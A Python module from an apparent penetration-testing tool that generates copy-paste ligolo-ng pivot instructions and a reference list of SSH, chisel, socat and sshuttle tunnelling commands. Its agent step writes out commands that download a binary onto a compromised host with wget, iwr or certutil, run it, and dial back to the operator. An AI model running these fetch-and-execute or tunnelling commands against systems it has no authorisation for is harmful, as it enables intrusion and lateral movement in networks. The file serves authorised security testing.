from __future__ import annotations

import fcntl
import ipaddress
import re
import socket
import struct
from dataclasses import dataclass, field

# Build the ligolo-ng pivot workflow as copy-paste command steps. Nabu does NOT run ligolo (it is a
# tunnelling relay, not a recon tool, and setting up a tun / route needs root) — this is a guided
# command-builder + reference, the same "shown, you run it" model as the Tier-2 manual commands.
# Once the internal /24 is routable over the ligolo interface, Nabu's "Scan a host / range" scans
# it transparently. Reference: https://docs.ligolo.ng/

_SIOCGIFADDR = 0x8915  # Linux ioctl: get an interface's IPv4 address

# Ligolo-ng project pointers — surfaced in the Pivot tab so the operator can grab the current binary
# and confirm syntax. Ligolo-ng changes often (e.g. `start` -> `tunnel_start`, `interface_create`),
# so the tab links the releases page rather than pretending a pinned version is forever-current.
LIGOLO_GITHUB = "https://github.com/nicocha30/ligolo-ng"
LIGOLO_RELEASES = "https://github.com/nicocha30/ligolo-ng/releases/latest"
LIGOLO_DOCS = "https://docs.ligolo.ng/"
# the ligolo-ng release the copy-paste syntax below was last checked against; the tab shows this + a
# "check releases" nudge so a stale reference is obvious. Bump when the commands are re-verified.
LIGOLO_REF_VERSION = "v0.8"
LIGOLO_REF_VERIFIED = "2026-07-18"


@dataclass
class LigoloStep:
    n: int
    title: str
    where: str  # Kali · pivot host · ligolo console · Nabu
    commands: list[str] = field(default_factory=list)
    note: str = ""


@dataclass(frozen=True)
class PivotMethod:
    name: str
    when: str  # one-line "use this when…"
    commands: list[str]


# Quick reference for the OTHER common pivot methods (CPTS: Pivoting, Tunneling & Port Forwarding) —
# when ligolo isn't an option (no root for a tun, only SSH, only a web-RCE, a Windows foothold, …).
# Copy-paste; edit the <ANGLE> placeholders. Recon-only relays/proxies, nothing exploits.
PIVOT_METHODS: tuple[PivotMethod, ...] = (
    PivotMethod(
        "SSH local forward (-L)",
        "reach ONE internal service through an SSH foothold",
        ["ssh -L <LPORT>:<INTERNAL_IP>:<PORT> <user>@<pivot>   # then hit 127.0.0.1:<LPORT>"],
    ),
    PivotMethod(
        "SSH dynamic SOCKS (-D)",
        "proxy ALL your tools into the internal net over SSH",
        [
            "ssh -D 9050 -fN <user>@<pivot>",
            "# add 'socks5 127.0.0.1 9050' to /etc/proxychains.conf, then: proxychains <tool> <ip>",
        ],
    ),
    PivotMethod(
        "SSH reverse forward (-R)",
        "expose YOUR listener to the internal net (catch a shell / serve a file)",
        ["ssh -R <pivot_port>:127.0.0.1:<LPORT> <user>@<pivot>"],
    ),
    PivotMethod(
        "chisel SOCKS (no SSH)",
        "SOCKS tunnel when you only have web/RCE — no SSH creds",
        [
            "./chisel server -p 1234 --reverse --socks5              # on Kali",
            "./chisel client <KALI>:1234 R:socks                     # on the pivot -> SOCKS :1080",
            "# proxychains (socks5 127.0.0.1 1080) then run your tools",
        ],
    ),
    PivotMethod(
        "sshuttle (no proxychains)",
        "VPN-like: route a whole subnet over SSH, no proxychains",
        ["sshuttle -r <user>@<pivot> 172.16.5.0/23       # add -x <pivot_ip> to avoid loops"],
    ),
    PivotMethod(
        "socat port relay",
        "relay a single internal port through the pivot host",
        ["socat TCP4-LISTEN:<LPORT>,fork TCP4:<INTERNAL_IP>:<PORT>    # run on the pivot"],
    ),
    PivotMethod(
        "plink (Windows pivot)",
        "dynamic SOCKS from a Windows foothold (PuTTY's plink)",
        ["plink -ssh -D 9050 <user>@<pivot>"],
    ),
)


def detect_tun_ip(iface: str = "tun0") -> str:
    # best-effort: the VPN/tunnel IP the agent should dial back to. Linux-only ioctl; "" on failure
    # (non-Linux, no such iface) so the dialog just leaves the field blank for the user to fill.
    try:
        with socket.socket(
            socket.AF_INET, socket.SOCK_DGRAM
        ) as sock:  # close the fd, success or not
            packed = struct.pack("256s", iface[:15].encode())
            return socket.inet_ntoa(fcntl.ioctl(sock.fileno(), _SIOCGIFADDR, packed)[20:24])
    except OSError:
        return ""


def _clean_iface(iface: str) -> str:
    # the iface name is interpolated into copy-paste console/route lines; keep it a bare interface
    # token (letters/digits/_/-, max 15 like the kernel limit) so a stray space/metachar can't turn
    # the copied command into two.
    text = (iface or "").strip()
    return text if re.fullmatch(r"[A-Za-z0-9_-]{1,15}", text) else "ligolo"


def _clean_routes(routes: list[str]) -> list[str]:
    out: list[str] = []
    for route in routes:
        text = (route or "").strip()
        if not text:
            continue
        try:
            ipaddress.ip_network(text, strict=False)  # a real CIDR — never a shell token
        except ValueError:
            continue
        if text not in out:
            out.append(text)
    return out


def _agent_step(ip: str, port: int, agent_os: str) -> LigoloStep:
    # OS-specific delivery + launch of the agent on the compromised pivot host — the transfer is the
    # step people trip on, so it's spelled out per OS. The Linux run line stays `./agent -connect`.
    if agent_os == "windows":
        return LigoloStep(
            2,
            "Deliver + run the agent on the Windows pivot",
            "Kali → Windows pivot",
            [
                "python3 -m http.server 8000                                 # on Kali: serve agent.exe",  # noqa: E501
                f"iwr -Uri http://{ip}:8000/agent.exe -OutFile $env:TEMP\\agent.exe   # on pivot (PowerShell)",  # noqa: E501
                f"& $env:TEMP\\agent.exe -connect {ip}:{port} -ignore-cert    # on pivot: dial back",  # noqa: E501
            ],
            "No PowerShell? certutil -urlcache -split -f http://"
            f"{ip}:8000/agent.exe %TEMP%\\agent.exe. The agent dials back to your proxy; a session "
            "then appears in the proxy console. Match agent.exe to your proxy's ligolo-ng version.",
        )
    return LigoloStep(
        2,
        "Deliver + run the agent on the Linux pivot",
        "Kali → Linux pivot",
        [
            "python3 -m http.server 8000                        # on Kali: serve the agent binary",  # noqa: E501
            f"wget http://{ip}:8000/agent -O agent && chmod +x agent   # on the Linux pivot",
            f"./agent -connect {ip}:{port} -ignore-cert          # on the Linux pivot: dial back",
        ],
        "curl -o agent http://"
        f"{ip}:8000/agent works too. The agent dials back to your proxy; a session then appears in "
        "the proxy console. Match the agent binary to your proxy's ligolo-ng version.",
    )


def build_ligolo_steps(
    kali_ip: str,
    port: int = 11601,
    iface: str = "ligolo",
    routes: list[str] | None = None,
    agent_os: str = "linux",
) -> list[LigoloStep]:
    ip = (kali_ip or "<your-tun0-ip>").strip()
    iface = _clean_iface(iface)
    agent_os = agent_os if agent_os in ("linux", "windows") else "linux"
    clean = _clean_routes(routes or [])
    steps: list[LigoloStep] = [
        LigoloStep(
            1,
            "Start the ligolo proxy",
            "Kali",
            [f"./proxy -selfcert -laddr 0.0.0.0:{port}"],
            "Listens for the agent (self-signed cert). Leave it running in its own terminal.",
        ),
        _agent_step(ip, port, agent_os),
    ]
    console = ["session", f"interface_create --name {iface}"]
    for route in clean or ["<internal_/24>"]:
        console.append(f"interface_add_route --name {iface} --route {route}")
    console.append(f"tunnel_start --tun {iface}")
    steps.append(
        LigoloStep(
            3,
            "In the ligolo proxy console",
            "ligolo console",
            console,
            "Pick the agent's session, create the tun, add the route(s), start the tunnel. "
            "(Older ligolo: the interface auto-creates and you run `start`, not `tunnel_start`.)",
        )
    )
    if clean:
        steps.append(
            LigoloStep(
                4,
                "If traffic doesn't route yet (older ligolo)",
                "Kali",
                [f"sudo ip route add {route} dev {iface}" for route in clean],
                "Modern ligolo's interface_add_route usually handles this — only needed if the "
                "route isn't already present.",
            )
        )
    scan_target = clean[0] if clean else "<internal_/24>"
    steps.append(
        LigoloStep(
            len(steps) + 1,
            "Scan the internal network from Nabu",
            "Nabu",
            [f"Scan → Scan a host / range → target: {scan_target}   (enable -Pn)"],
            "Hosts stream into the recon tree + graph, grouped by subnet, pivoted via this host.",
        )
    )
    return steps
